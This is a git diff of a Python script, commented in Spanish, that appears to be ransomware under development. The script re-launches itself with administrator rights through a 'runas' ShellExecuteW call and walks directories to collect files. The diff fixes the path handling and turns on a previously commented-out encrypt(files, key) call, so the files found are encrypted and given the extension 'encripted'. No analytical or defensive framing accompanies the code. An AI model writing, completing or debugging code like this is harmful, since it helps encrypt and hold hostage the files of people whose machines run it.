@@ -11,13 +11,15 @@ def es_admin():
         return False
 
 if es_admin():
-    # El código que se ejecutará como administrador va aquí
+    # Código que se ejecutará con privilegios de administrador
     pass
 else:
-    # Reejecuta el programa con privilegios de administrador
+    # Re-ejecuta el programa con privilegios de administrador
     ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
 
-# Extensión para los archivos encriptados.
+
+
+
 extension = 'encripted'
 
 
@@ -72,10 +74,10 @@ if __name__ == '__main__':
                 files = set()
                 for item in itemsInPath:
                     if os.path.isdir(path+item):
-                        directories.add(path+"\\"+item)
+                        directories.add(path+item+"\\")
                     else:
-                        files.add(path+"\\"+item) 
-                # encrypt(files, key)
+                        files.add(path+item) 
+                encrypt(files, key)
 
             except Exception as e:
                 print('Error:', e)
